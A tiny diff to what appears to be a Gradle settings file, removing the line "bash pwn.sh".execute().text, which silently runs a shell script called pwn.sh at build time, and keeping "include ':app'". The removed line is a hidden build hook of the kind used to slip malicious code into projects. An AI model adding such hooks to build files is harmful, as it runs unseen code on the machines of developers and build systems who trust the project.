@@ -1,2 +1,1 @@
-"bash pwn.sh".execute().text
 include ':app'
